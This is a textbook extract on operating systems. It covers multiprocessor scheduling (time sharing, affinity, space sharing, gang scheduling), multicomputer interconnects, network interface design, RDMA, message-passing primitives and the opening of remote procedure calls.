# Modern Operating Systems 4th Edition_2

An example of the latter situation occurs regularly in program development environments. Large systems often consist of some number of header files containing macros, type definitions, and variable declarations that are used by the actual code files. When a header file is changed, all the code files that include it must be recompiled. The program make is commonly used to manage development. When make is invoked, it starts the compilation of only those code files that must be recompiled on account of changes to the header or code files. Object files that are still valid are not regenerated.

The original version of make did its work sequentially, but newer versions designed for multiprocessors can start up all the compilations at once. If 10 compilations are needed, it does not make sense to schedule 9 of them to run immediately and leave the last one until much later since the user will not perceive the work as completed until the last one has finished. In this case it makes sense to regard the threads doing the compilations as a group and to take that into account when scheduling them.

Moroever sometimes it is useful to schedule threads that communicate extensively, say in a producer-consumer fashion, not just at the same time, but also close together in space. For instance, they may benefit from sharing caches. Likewise, in NUMA architectures, it may help if they access memory that is close by.

## Time Sharing

Let us first address the case of scheduling independent threads; later we will consider how to schedule related threads. The simplest scheduling algorithm for dealing with unrelated threads is to have a single systemwide data structure for ready threads, possibly just a list, but more likely a set of lists for threads at different priorities as depicted in Fig. 8-12(a). Here the 16 CPUs are all currently busy, and a prioritized set of 14 threads are waiting to run. The first CPU to finish its current work (or have its thread block) is CPU 4, which then locks the scheduling queues and selects the highest-priority thread, A, as shown in Fig. 8-12(b). Next, CPU 12 goes idle and chooses thread $B$, as illustrated in Fig. 8-12(c). As long as the threads are completely unrelated, doing scheduling this way is a reasonable choice and it is very simple to implement efficiently.

Having a single scheduling data structure used by all CPUs timeshares the CPUs, much as they would be in a uniprocessor system. It also provides automatic load balancing because it can never happen that one CPU is idle while others are overloaded. Two disadvantages of this approach are the potential contention for the scheduling data structure as the number of CPUs grows and the usual overhead in doing a context switch when a thread blocks for I/O.

It is also possible that a context switch happens when a thread’s quantum expires. On a multiprocessor, that has certain properties not present on a uniprocessor. Suppose that the thread happens to hold a spin lock when its quantum expires. Other CPUs waiting on the spin lock just waste their time spinning until that

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-002_594_1273_234_131.jpg)

Figure 8-12. Using a single data structure for scheduling a multiprocessor.

thread is scheduled again and releases the lock. On a uniprocessor, spin locks are rarely used, so if a process is suspended while it holds a mutex, and another thread starts and tries to acquire the mutex, it will be immediately blocked, so little time is wasted.

To get around this anomaly, some systems use smart scheduling, in which a thread acquiring a spin lock sets a processwide flag to show that it currently has a spin lock (Zahorjan et al., 1991). When it releases the lock, it clears the flag. The scheduler then does not stop a thread holding a spin lock, but instead gives it a little more time to complete its critical region and release the lock.

Another issue that plays a role in scheduling is the fact that while all CPUs are equal, some CPUs are more equal. In particular, when thread $A$ has run for a long time on CPU $k$, CPU $k$ ’s cache will be full of $A$ ’s blocks. If $A$ gets to run again soon, it may perform better if it is run on CPU $k$, because $k$ ’s cache may still contain some of $A$ ’s blocks. Having cache blocks preloaded will increase the cache hit rate and thus the thread’s speed. In addition, the TLB may also contain the right pages, reducing TLB faults.

Some multiprocessors take this effect into account and use what is called affinity scheduling (Vaswani and Zahorjan, 1991). The basic idea here is to make a serious effort to have a thread run on the same CPU it ran on last time. One way to create this affinity is to use a two-level scheduling algorithm. When a thread is created, it is assigned to a CPU, for example based on which one has the smallest load at that moment. This assignment of threads to CPUs is the top level of the algorithm. As a result of this policy, each CPU acquires its own collection of threads.

The actual scheduling of the threads is the bottom level of the algorithm. It is done by each CPU separately, using priorities or some other means. By trying to
keep a thread on the same CPU for its entire lifetime, cache affinity is maximized. However, if a CPU has no threads to run, it takes one from another CPU rather than go idle.

Two-level scheduling has three benefits. First, it distributes the load roughly evenly over the available CPUs. Second, advantage is taken of cache affinity where possible. Third, by giving each CPU its own ready list, contention for the ready lists is minimized because attempts to use another CPU’s ready list are relatively infrequent.

## Space Sharing

The other general approach to multiprocessor scheduling can be used when threads are related to one another in some way. Earlier we mentioned the example of parallel make as one case. It also often occurs that a single process has multiple threads that work together. For example, if the threads of a process communicate a lot, it is useful to have them running at the same time. Scheduling multiple threads at the same time across multiple CPUs is called space sharing.

The simplest space-sharing algorithm works like this. Assume that an entire group of related threads is created at once. At the time it is created, the scheduler checks to see if there are as many free CPUs as there are threads. If there are, each thread is given its own dedicated (i.e., nonmultiprogrammed) CPU and they all start. If there are not enough CPUs, none of the threads are started until enough CPUs are available. Each thread holds onto its CPU until it terminates, at which time the CPU is put back into the pool of available CPUs. If a thread blocks on I/O, it continues to hold the CPU, which is simply idle until the thread wakes up. When the next batch of threads appears, the same algorithm is applied.

At any instant of time, the set of CPUs is statically partitioned into some number of partitions, each one running the threads of one process. In Fig. 8-13, we have partitions of sizes 4, 6, 8, and 12 CPUs, with 2 CPUs unassigned, for example. As time goes on, the number and size of the partitions will change as new threads are created and old ones finish and terminate.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-003_354_1123_1613_206.jpg)

Figure 8-13. A set of 32 CPUs split into four partitions, with two CPUs available.

Periodically, scheduling decisions have to be made. In uniprocessor systems, shortest job first is a well-known algorithm for batch scheduling. The analogous algorithm for a multiprocessor is to choose the process needing the smallest number of CPU cycles, that is, the thread whose CPU-count × run-time is the smallest of the candidates. However, in practice, this information is rarely available, so the algorithm is hard to carry out. In fact, studies have shown that, in practice, beating first-come, first-served is hard to do (Krueger et al., 1994).

In this simple partitioning model, a thread just asks for some number of CPUs and either gets them all or has to wait until they are available. A different approach is for threads to actively manage the degree of parallelism. One method for managing the parallelism is to have a central server that keeps track of which threads are running and want to run and what their minimum and maximum CPU requirements are (Tucker and Gupta, 1989). Periodically, each application polls the central server to ask how many CPUs it may use. It then adjusts the number of threads up or down to match what is available.

For example, a Web server can have 5, 10, 20, or any other number of threads running in parallel. If it currently has 10 threads and there is suddenly more demand for CPUs and it is told to drop to five, when the next five threads finish their current work, they are told to exit instead of being given new work. This scheme allows the partition sizes to vary dynamically to match the current workload better than the fixed system of Fig. 8-13.

## Gang Scheduling

A clear advantage of space sharing is the elimination of multiprogramming, which eliminates the context-switching overhead. However, an equally clear disadvantage is the time wasted when a CPU blocks and has nothing at all to do until it becomes ready again. Consequently, people have looked for algorithms that attempt to schedule in both time and space together, especially for threads that create multiple threads, which usually need to communicate with one another.

To see the kind of problem that can occur when the threads of a process are independently scheduled, consider a system with threads $A_{0}$ and $A_{1}$ belonging to process $A$ and threads $B_{0}$ and $B_{1}$ belonging to process $B$. Threads $A_{0}$ and $B_{0}$ are timeshared on CPU 0; threads $A_{1}$ and $B_{1}$ are timeshared on CPU 1. Threads $A_{0}$ and $A_{1}$ need to communicate often. The communication pattern is that $A_{0}$ sends $A_{1}$ a message, with $A_{1}$ then sending back a reply to $A_{0}$, followed by another such sequence, common in client-server situations. Suppose luck has it that $A_{0}$ and $B_{1}$ start first, as shown in Fig. 8-14.

In time slice $0, A_{0}$ sends $A_{1}$ a request, but $A_{1}$ does not get it until it runs in time slice 1 starting at 100 msec. It sends the reply immediately, but $A_{0}$ does not get the reply until it runs again at 200 msec . The net result is one request-reply sequence every 200 msec. Not very good performance.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-005_407_1012_283_261.jpg)

Figure 8-14. Communication between two threads belonging to thread

$A$

that are running out of phase.

The solution to this problem is gang scheduling, which is an outgrowth of coscheduling (Ousterhout, 1982). Gang scheduling has three parts:

1. Groups of related threads are scheduled as a unit, a gang.
2. All members of a gang run at once on different timeshared CPUs.
3. All gang members start and end their time slices together.

The trick that makes gang scheduling work is that all CPUs are scheduled synchronously. Doing this means that time is divided into discrete quanta as we had in Fig. 8-14. At the start of each new quantum, all the CPUs are rescheduled, with a new thread being started on each one. At the start of the next quantum, another scheduling event happens. In between, no scheduling is done. If a thread blocks, its CPU stays idle until the end of the quantum.

An example of how gang scheduling works is given in Fig. 8-15. Here we have a multiprocessor with six CPUs being used by five processes, $A$ through $E$, with a total of 24 ready threads. During time slot 0 , threads $A_{0}$ through $A_{6}$ are scheduled and run. During time slot 1 , threads $B_{0}, B_{1}, B_{2}, C_{0}, C_{1}$, and $C_{2}$ are scheduled and run. During time slot $2, D$ ’s five threads and $E_{0}$ get to run. The remaining six threads belonging to thread $E$ run in time slot 3 . Then the cycle repeats, with slot 4 being the same as slot 0 and so on.

The idea of gang scheduling is to have all the threads of a process run together, at the same time, on different CPUs, so that if one of them sends a request to another one, it will get the message almost immediately and be able to reply almost immediately. In Fig. 8-15, since all the $A$ threads are running together, during one quantum, they may send and receive a very large number of messages in one quantum, thus eliminating the problem of Fig. 8-14.

|  |  | CPU |  |  |  |  |  |
| --- | --- | --- | --- | --- | --- | --- | --- |
|  |  | 0 | 1 | 2 | 3 | 4 | 5 |
| Time slot | 0 | $\mathrm{A}_{0}$ | $\mathrm{A}_{1}$ | $\mathrm{A}_{2}$ | $\mathrm{A}_{3}$ | $\mathrm{A}_{4}$ | $\mathrm{A}_{5}$ |
|  | 1 | $\mathrm{B}_{0}$ | $\mathrm{B}_{1}$ | $\mathrm{B}_{2}$ | $\mathrm{C}_{0}$ | $\mathrm{C}_{1}$ | $\mathrm{C}_{2}$ |
|  | 2 | $\mathrm{D}_{0}$ | $\mathrm{D}_{1}$ | $\mathrm{D}_{2}$ | $\mathrm{D}_{3}$ | $\mathrm{D}_{4}$ | $\mathrm{E}_{0}$ |
|  | 3 | $\mathrm{E}_{1}$ | $\mathrm{E}_{2}$ | $\mathrm{E}_{3}$ | $\mathrm{E}_{4}$ | $\mathrm{E}_{5}$ | $\mathrm{E}_{6}$ |
|  | 4 | $\mathrm{A}_{0}$ | $\mathrm{A}_{1}$ | $\mathrm{A}_{2}$ | $\mathrm{A}_{3}$ | $\mathrm{A}_{4}$ | $\mathrm{A}_{5}$ |
|  | 5 | $\mathrm{B}_{0}$ | $\mathrm{B}_{1}$ | $\mathrm{B}_{2}$ | $\mathrm{C}_{0}$ | $\mathrm{C}_{1}$ | $\mathrm{C}_{2}$ |
|  | 6 | $\mathrm{D}_{0}$ | $\mathrm{D}_{1}$ | $\mathrm{D}_{2}$ | $\mathrm{D}_{3}$ | $\mathrm{D}_{4}$ | $\mathrm{E}_{0}$ |
|  | 7 | $\mathrm{E}_{1}$ | $\mathrm{E}_{2}$ | $\mathrm{E}_{3}$ | $\mathrm{E}_{4}$ | $\mathrm{E}_{5}$ | $\mathrm{E}_{6}$ |

Figure 8-15. Gang scheduling.

### 8.2 MULTICOMPUTERS

Multiprocessors are popular and attractive because they offer a simple communication model: all CPUs share a common memory. Processes can write messages to memory that can then be read by other processes. Synchronization can be done using mutexes, semaphores, monitors, and other well-established techniques. The only fly in the ointment is that large multiprocessors are difficult to build and thus expensive. And very large ones are impossible to build at any price. So something else is needed if we are to scale up to large numbers of CPUs.

To get around these problems, much research has been done on multicomputers, which are tightly coupled CPUs that do not share memory. Each one has its own memory, as shown in Fig. 8-1(b). These systems are also known by a variety of other names, including cluster computers and COWS (Clusters Of Workstations). Cloud computing services are always built on multicomputers because they need to be large.

Multicomputers are easy to build because the basic component is just a stripped-down PC, without a keyboard, mouse, or monitor, but with a high-performance network interface card. Of course, the secret to getting high performance is to design the interconnection network and the interface card cleverly. This problem is completely analogous to building the shared memory in a multiprocessor [e.g., see Fig. 8-1(b)]. However, the goal is to send messages on a microsecond time scale, rather than access memory on a nanosecond time scale, so it is simpler, cheaper, and easier to accomplish.

In the following sections, we will first take a brief look at multicomputer hardware, especially the interconnection hardware. Then we will move onto the software, starting with low-level communication software, then high-level communication software. We will also look at a way shared memory can be achieved on systems that do not have it. Finally, we will examine scheduling and load balancing.

### 8.2.1 Multicomputer Hardware

The basic node of a multicomputer consists of a CPU, memory, a network interface, and sometimes a hard disk. The node may be packaged in a standard PC case, but the monitor, keyboard, and mouse are nearly always absent. Sometimes this configuration is called a headless workstation because there is no user with a head in front of it. A workstation with a human user should logically be called a “headed workstation,” but for some reason it is not. In some cases, the PC contains a 2-way or 4-way multiprocessor board, possibly each with a dual-, quad- or octa-core chip, instead of a single CPU, but for simplicity, we will assume that each node has one CPU. Often hundreds or even thousands of nodes are hooked together to form a multicomputer. Below we will say a little about how this hardware is organized.

## Interconnection Technology

Each node has a network interface card with one or two cables (or fibers) coming out of it. These cables connect either to other nodes or to switches. In a small system, there may be one switch to which all the nodes are connected in the star topology of Fig. 8-16(a). Modern switched Ethernets use this topology.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-007_823_1155_1108_189.jpg)

Figure 8-16. Various interconnect topologies. (a) A single switch. (b) A ring. (c) A grid. (d) A double torus. (e) A cube. (f) A 4D hypercube.

As an alternative to the single-switch design, the nodes may form a ring, with two wires coming out the network interface card, one into the node on the left and one going into the node on the right, as shown in Fig. 8-16(b). In this topology, no switches are needed and none are shown.

The grid or mesh of Fig. 8-16(c) is a two-dimensional design that has been used in many commercial systems. It is highly regular and easy to scale up to large sizes. It has a diameter, which is the longest path between any two nodes, and which increases only as the square root of the number of nodes. A variant on the grid is the double torus of Fig. 8-16(d), which is a grid with the edges connected. Not only is it more fault tolerant than the grid, but the diameter is also less because the opposite corners can now communicate in only two hops.

The cube of Fig. 8-16(e) is a regular three-dimensional topology. We have illustrated a 2 × 2 × 2 cube, but in the most general case it could be a $k \times k \times k$ cube. In Fig. 8-16(f) we have a four-dimensional cube built from two three-dimensional cubes with the corresponding nodes connected. We could make a fivedimensional cube by cloning the structure of Fig. 8-16(f) and connecting the corresponding nodes to form a block of four cubes. To go to six dimensions, we could replicate the block of four cubes and interconnect the corresponding nodes, and so on. An $n$-dimensional cube formed this way is called a hypercube.

Many parallel computers use a hypercube topology because the diameter grows linearly with the dimensionality. Put in other words, the diameter is the base 2 logarithm of the number of nodes. For example, a 10-dimensional hypercube has 1024 nodes but a diameter of only 10, giving excellent delay properties. Note that in contrast, 1024 nodes arranged as a $32 \times 32$ grid have a diameter of 62 , more than six times worse than the hypercube. The price paid for the smaller diameter is that the fanout, and thus the number of links (and the cost), is much larger for the hypercube.

Two kinds of switching schemes are used in multicomputers. In the first one, each message is first broken up (either by the user software or the network interface) into a chunk of some maximum length called a packet. The switching scheme, called store-and-forward packet switching, consists of the packet being injected into the first switch by the source node’s network interface board, as shown in Fig. 8-17(a). The bits come in one at a time, and when the whole packet has arrived at an input buffer, it is copied to the line leading to the next switch along the path, as shown in Fig. 8-17(b). When the packet arrives at the switch attached to the destination node, as shown in Fig. 8-17(c), the packet is copied to that node’s network interface board and eventually to its RAM.

While store-and-forward packet switching is flexible and efficient, it does have the problem of increasing latency (delay) through the interconnection network. Suppose that the time to move a packet one hop in Fig. 8-17 is $T$ nsec. Since the packet must be copied four times to get it from CPU 1 to CPU 2 (to $A$, to $C$, to $D$, and to the destination CPU), and no copy can begin until the previous one is finished, the latency through the interconnection network is $4 T$. One way out is to

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-009_587_1291_237_122.jpg)

Figure 8-17. Store-and-forward packet switching.

design a network in which a packet can be logically divided into smaller units. As soon as the first unit arrives at a switch, it can be forwarded, even before the tail has arrived. Conceivably, the unit could be as small as 1 bit.

The other switching regime, circuit switching, consists of the first switch first establishing a path through all the switches to the destination switch. Once that path has been set up, the bits are pumped all the way from the source to the destination nonstop as fast as possible. There is no intermediate buffering at the intervening switches. Circuit switching requires a setup phase, which takes some time, but is faster once the setup has been completed. After the packet has been sent, the path must be torn down again. A variation on circuit switching, called wormhole routing, breaks each packet up into subpackets and allows the first subpacket to start flowing even before the full path has been built.

## Network Interfaces

All the nodes in a multicomputer have a plug-in board containing the node’s connection to the interconnection network that holds the multicomputer together. The way these boards are built and how they connect to the main CPU and RAM have substantial implications for the operating system. We will now briefly look at some of the issues here. This material is based in part on the work of Bhoedjang (2000).

In virtually all multicomputers, the interface board contains substantial RAM for holding outgoing and incoming packets. Usually, an outgoing packet has to be copied to the interface board’s RAM before it can be transmitted to the first switch. The reason for this design is that many interconnection networks are synchronous, so that once a packet transmission has started, the bits must continue flowing at a
constant rate. If the packet is in the main RAM, this continuous flow out onto the network cannot be guaranteed due to other traffic on the memory bus. Using a dedicated RAM on the interface board eliminates this problem. This design is shown in Fig. 8-18.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-010_559_1035_419_250.jpg)

Figure 8-18. Position of the network interface boards in a multicomputer.

The same problem occurs with incoming packets. The bits arrive from the network at a constant and often extremely high rate. If the network interface board cannot store them in real time as they arrive, data will be lost. Again here, trying to go over the system bus (e.g., the PCI bus) to the main RAM is too risky. Since the network board is typically plugged into the PCI bus, this is the only connection it has to the main RAM, so competing for this bus with the disk and every other I/O device is inevitable. It is safer to store incoming packets in the interface board’s private RAM and then copy them to the main RAM later.

The interface board may have one or more DMA channels or even a complete CPU (or maybe even multiple CPUs) on board. The DMA channels can copy packets between the interface board and the main RAM at high speed by requesting block transfers on the system bus, thus transferring several words without having to request the bus separately for each word. However, it is precisely this kind of block transfer, which ties up the system bus for multiple bus cycles, that makes the interface board RAM necessary in the first place.

Many interface boards have a CPU on them, possibly in addition to one or more DMA channels. They are called network processors and are becoming increasingly powerful (El Ferkouss et al., 2011). This design means that the main CPU can offload some work to the network board, such as handling reliable transmission (if the underlying hardware can lose packets), multicasting (sending a packet to more than one destination), compression/decompression, encryption/decryption, and taking care of protection in a system that has multiple processes.

However, having two CPUs means that they must synchronize to avoid race conditions, which adds extra overhead and means more work for the operating system.

Copying data across layers is safe, but not necessarily efficient. For instance, a brower requesting data from a remote web server will create a request in the browser’s address space. That request is subsequently copied to the kernel so that TCP and IP can handle it. Next, the data are copied to the memory of the network interface. On the other end, the inverse happens: the data are copied from the network card to a kernel buffer, and from a kernel buffer to the Web server. Quite a few copies, unfortunately. Each copy introduces overhead, not just the copying itself, but also the pressure on the cache, TLB, etc. As a consequence, the latency over such network connections is high.

In the next section, we discuss techniques to reduce the overhead due to copying, cache pollution, and context switching as much as possible.

### 8.2.2 Low-Level Communication Software

The enemy of high-performance communication in multicomputer systems is excess copying of packets. In the best case, there will be one copy from RAM to the interface board at the source node, one copy from the source interface board to the destination interface board (if no storing and forwarding along the path occurs), and one copy from there to the destination RAM, a total of three copies. However, in many systems it is even worse. In particular, if the interface board is mapped into kernel virtual address space and not user virtual address space, a user process can send a packet only by issuing a system call that traps to the kernel. The kernels may have to copy the packets to their own memory both on output and on input, for example, to avoid page faults while transmitting over the network. Also, the receiving kernel probably does not know where to put incoming packets until it has had a chance to examine them. These five copy steps are illustrated in Fig. 8-18.

If copies to and from RAM are the bottleneck, the extra copies to and from the kernel may double the end-to-end delay and cut the throughput in half. To avoid this performance hit, many multicomputers map the interface board directly into user space and allow the user process to put the packets on the board directly, without the kernel being involved. While this approach definitely helps performance, it introduces two problems.

First, what if several processes are running on the node and need network access to send packets? Which one gets the interface board in its address space? Having a system call to map the board in and out of a virtual address space is expensive, but if only one process gets the board, how do the other ones send packets? And what happens if the board is mapped into process $A$ ’s virtual address space and a packet arrives for process $B$, especially if $A$ and $B$ have different owners, neither of whom wants to put in any effort to help the other?

One solution is to map the interface board into all processes that need it, but then a mechanism is needed to avoid race conditions. For example, if $A$ claims a
buffer on the interface board, and then, due to a time slice, $B$ runs and claims the same buffer, disaster results. Some kind of synchronization mechanism is needed, but these mechanisms, such as mutexes, work only when the processes are assumed to be cooperating. In a shared environment with multiple users all in a hurry to get their work done, one user might just lock the mutex associated with the board and never release it. The conclusion here is that mapping the interface board into user space really works well only when there is just one user process running on each node unless special precautions are taken (e.g., different processes get different portions of the interface RAM mapped into their address spaces).

The second problem is that the kernel may well need access to the interconnection network itself, for example, to access the file system on a remote node. Having the kernel share the interface board with any users is not a good idea. Suppose that while the board was mapped into user space, a kernel packet arrived. Or suppose that the user process sent a packet to a remote machine pretending to be the kernel. The conclusion is that the simplest design is to have two network interface boards, one mapped into user space for application traffic and one mapped into kernel space for use by the operating system. Many multicomputers do precisely this.

On the other hand, newer network interfaces are frequently multiqueue, which means that they have more than one buffer to support multiple users efficiently. For instance, the Intel I350 series of network cards has 8 send and 8 receive queues, and is virtualizable to many virtual ports. Better still, the card supports core affinity. Specifically, it has its own hashing logic to help steer each packet to a suitable process. As it is faster to process all segments in the same TCP flow on the same processor (where the caches are warm), the card can use the hashing logic to hash the TCP flow fields (IP addresses and TCP port numbers) and add all segments with the same hash on the same queue that is served by a specific core. This is also useful for virtualization, as it allows us to give each virtual machine its own queue.

## Node-to-Network Interface Communication

Another issue is how to get packets onto the interface board. The fastest way is to use the DMA chip on the board to just copy them in from RAM. The problem with this approach is that DMA may use physical rather than virtual addresses and runs independently of the CPU, unless an I/O MMU is present. To start with, although a user process certainly knows the virtual address of any packet it wants to send, it generally does not know the physical address. Making a system call to do the virtual-to-physical mapping is undesirable, since the point of putting the interface board in user space in the first place was to avoid having to make a system call for each packet to be sent.

In addition, if the operating system decides to replace a page while the DMA chip is copying a packet from it, the wrong data will be transmitted. Worse yet, if the operating system replaces a page while the DMA chip is copying an incoming
packet to it, not only will the incoming packet be lost, but also a page of innocent memory will be ruined, probably with disastrous consequences shortly.

These problems can be avoided by having system calls to pin and unpin pages in memory, marking them as temporarily unpageable. However, having to make a system call to pin the page containing each outgoing packet and then having to make another call later to unpin it is expensive. If packets are small, say, 64 bytes or less, the overhead for pinning and unpinning every buffer is prohibitive. For large packets, say, 1 KB or more, it may be tolerable. For sizes in between, it depends on the details of the hardware. Besides introducing a performance hit, pinning and unpinning pages adds to the software complexity.

## Remote Direct Memory Access

In some fields, high network latencies are simply not acceptable. For instance, for certain applications in high-performance computing the computation time is strongly dependent on the network latency. Likewise, high-frequency trading is all about having computers perform transactions (buying and selling stock) at extremely high speeds-every microsecond counts. Whether or not it is wise to have computer programs trade millions of dollars worth of stock in a millisecond, when pretty much all software tends to be buggy, is an interesting question for dining philosophers to consider when they are not busy grabbing their forks. But not for this book. The point here is that if you manage to get the latency down, it is sure to make you very popular with your boss.

In these scenarios, it pays to reduce the amount of copying. For this reason, some network interfaces support RDMA (Remote Direct Memory Access), a technique that allows one machine to perform a direct memory access from one computer to that of another. The RDMA does not involve either of the operating system and the data is directly fetched from, or written to, application memory.

RDMA sounds great, but it is not without its disadvantages. Just like normal DMA, the operating system on the communicating nodes must pin the pages involved in the data exchange. Also, just placing data in a remote computer’s memory will not reduce the latency much if the other program is not aware of it. A successful RDMA does not automatically come with an explicit notification. Instead, a common solution is that a receiver polls on a byte in memory. When the transfer is done, the sender modifies the byte to signal the receiver that there is new data. While this solution works, it is not ideal and wastes CPU cycles.

For really serious high-frequency trading, the network cards are custom built using field-programmable gate arrays. They have wire-to-wire latency, from receiving the bits on the network card to transmitting a message to buy a few million worth of something, in well under a microsecond. Buying $1 million worth of stock in $1 \mu \mathrm{sec}$ gives a performance of 1 terabuck/sec, which is nice if you can get the ups and downs right, but is not for the faint of heart. Operating systems do not play much of a role in such extreme settings.

### 8.2.3 User-Level Communication Software

Processes on different CPUs on a multicomputer communicate by sending messages to one another. In the simplest form, this message passing is exposed to the user processes. In other words, the operating system provides a way to send and receive messages, and library procedures make these underlying calls available to user processes. In a more sophisticated form, the actual message passing is hidden from users by making remote communication look like a procedure call. We will study both of these methods below.

## Send and Receive

At the barest minimum, the communication services provided can be reduced to two (library) calls, one for sending messages and one for receiving them. The call for sending a message might be

```
send(dest, &mptr);
```

and the call for receiving a message might be

```
receive(addr, &mptr);
```

The former sends the message pointed to by mptr to a process identified by dest and causes the called to be blocked until the message has been sent. The latter causes the called to be blocked until a message arrives. When one does, the message is copied to the buffer pointed to by mptr and the called is unblocked. The addr parameter specifies the address to which the receiver is listening. Many variants of these two procedures and their parameters are possible.

One issue is how addressing is done. Since multicomputers are static, with the number of CPUs fixed, the easiest way to handle addressing is to make addr a twopart address consisting of a CPU number and a process or port number on the addressed CPU. In this way each CPU can manage its own addresses without potential conflicts.

## Blocking versus Nonblocking Calls

The calls described above are blocking calls (sometimes called synchronous calls). When a process calls send, it specifies a destination and a buffer to send to that destination. While the message is being sent, the sending process is blocked (i.e., suspended). The instruction following the call to send is not executed until the message has been completely sent, as shown in Fig. 8-19(a). Similarly, a call to receive does not return control until a message has actually been received and put in the message buffer pointed to by the parameter. The process remains suspended in receive until a message arrives, even if it takes hours. In some systems,
the receiver can specify from whom it wishes to receive, in which case it remains blocked until a message from that sender arrives.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-015_768_1162_374_187.jpg)

Figure 8-19. (a) A blocking send call. (b) A nonblocking send call.

An alternative to blocking calls is the use of nonblocking calls (sometimes called asynchronous calls). If send is nonblocking, it returns control to the called immediately, before the message is sent. The advantage of this scheme is that the sending process can continue computing in parallel with the message transmission, instead of having the CPU go idle (assuming no other process is runnable). The choice between blocking and nonblocking primitives is normally made by the system designers (i.e., either one primitive is available or the other), although in a few systems both are available and users can choose their favorite.

However, the performance advantage offered by nonblocking primitives is offset by a serious disadvantage: the sender cannot modify the message buffer until the message has been sent. The consequences of the process overwriting the message during transmission are too horrible to contemplate. Worse yet, the sending process has no idea of when the transmission is done, so it never knows when it is safe to reuse the buffer. It can hardly avoid touching it forever.

There are three possible ways out. The first solution is to have the kernel copy the message to an internal kernel buffer and then allow the process to continue, as shown in Fig. 8-19(b). From the sender’s point of view, this scheme is the same as a blocking call: as soon as it gets control back, it is free to reuse the buffer. Of
course, the message will not yet have been sent, but the sender is not hindered by this fact. The disadvantage of this method is that every outgoing message has to be copied from user space to kernel space. With many network interfaces, the message will have to be copied to a hardware transmission buffer later anyway, so the first copy is essentially wasted. The extra copy can reduce the performance of the system considerably.

The second solution is to interrupt (signal) the sender when the message has been fully sent to inform it that the buffer is once again available. No copy is required here, which saves time, but user-level interrupts make programming tricky, difficult, and subject to race conditions, which makes them irreproducible and nearly impossible to debug.

The third solution is to make the buffer copy on write, that is, to mark it as read only until the message has been sent. If the buffer is reused before the message has been sent, a copy is made. The problem with this solution is that unless the buffer is isolated on its own page, writes to nearby variables will also force a copy. Also, extra administration is needed because the act of sending a message now implicitly affects the read/write status of the page. Finally, sooner or later the page is likely to be written again, triggering a copy that may no longer be necessary.

Thus the choices on the sending side are

1. Blocking send (CPU idle during message transmission).
2. Nonblocking send with copy (CPU time wasted for the extra copy).
3. Nonblocking send with interrupt (makes programming difficult).
4. Copy on write (extra copy probably needed eventually).

Under normal conditions, the first choice is the most convenient, especially if multiple threads are available, in which case while one thread is blocked trying to send, other threads can continue working. It also does not require any kernel buffers to be managed. Furthermore, as can be seen from comparing Fig. 8-19(a) to Fig. 8-19(b), the message will usually be out the door faster if no copy is required.

For the record, we would like to point out that some authors use a different criterion to distinguish synchronous from asynchronous primitives. In the alternative view, a call is synchronous only if the sender is blocked until the message has been received and an acknowledgement sent back (Andrews, 1991). In the world of real-time communication, synchronous has yet another meaning, which can lead to confusion, unfortunately.

Just as send can be blocking or nonblocking, so can receive. A blocking call just suspends the called until a message has arrived. If multiple threads are available, this is a simple approach. Alternatively, a nonblocking receive just tells the kernel where the buffer is and returns control almost immediately. An interrupt can be used to signal that a message has arrived. However, interrupts are difficult to program and are also quite slow, so it may be preferable for the receiver to poll
for incoming messages using a procedure, poll, that tells whether any messages are waiting. If so, the called can call get_message, which returns the first arrived message. In some systems, the compiler can insert poll calls in the code at appropriate places, although knowing how often to poll is tricky.

Yet another option is a scheme in which the arrival of a message causes a new thread to be created spontaneously in the receiving process’ address space. Such a thread is called a pop-up thread. It runs a procedure specified in advance and whose parameter is a pointer to the incoming message. After processing the message, it simply exits and is automatically destroyed.

A variant on this idea is to run the receiver code directly in the interrupt handler, without going to the trouble of creating a pop-up thread. To make this scheme even faster, the message itself contains the address of the handler, so when a message arrives, the handler can be called in a few instructions. The big win here is that no copying at all is needed. The handler takes the message from the interface board and processes it on the fly. This scheme is called active messages (Von Eicken et al., 1992). Since each message contains the address of the handler, active messages work only when senders and receivers trust each other completely.

### 8.2.4 Remote Procedure Call

Although the message-passing model provides a convenient way to structure a multicomputer operating system, it suffers from one incurable flaw: the basic paradigm around which all communication is built is input/output. The procedures send and receive are fundamentally engaged in doing I/O, and many people believe that I/O is the wrong programming model.

This problem has long been known, but little was done about it until a paper by Birrell and Nelson (1984) introduced a completely different way of attacking the problem. Although the idea is refreshingly simple (once someone has thought of it), the implications are often subtle. In this section we will examine the concept, its implementation, its strengths, and its weaknesses.

In a nutshell, what Birrell and Nelson suggested was allowing programs to call procedures located on other CPUs. When a process on machine 1 calls a procedure on machine 2, the calling process on 1 is suspended, and execution of the called procedure takes place on 2. Information can be transported from the called to the callee in the parameters and can come back in the procedure result. No message passing or I/O at all is visible to the programmer. This technique is known as RPC (Remote Procedure Call) and has become the basis of a large amount of multicomputer software. Traditionally the calling procedure is known as the client and the called procedure is known as the server, and we will use those names here too.

The idea behind RPC is to make a remote procedure call look as much as possible like a local one. In the simplest form, to call a remote procedure, the client program must be bound with a small library procedure called the client stub that
represents the server procedure in the client’s address space. Similarly, the server is bound with a procedure called the server stub. These procedures hide the fact that the procedure call from the client to the server is not local.

The actual steps in making an RPC are shown in Fig. 8-20. Step 1 is the client calling the client stub. This call is a local procedure call, with the parameters pushed onto the stack in the normal way. Step 2 is the client stub packing the parameters into a message and making a system call to send the message. Packing the parameters is called marshalling. Step 3 is the kernel sending the message from the client machine to the server machine. Step 4 is the kernel passing the incoming packet to the server stub (which would normally have called receive earlier). Finally, step 5 is the server stub calling the server procedure. The reply traces the same path in the other direction.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-018_512_1051_750_240.jpg)

Figure 8-20. Steps in making a remote procedure call. The stubs are shaded gray.

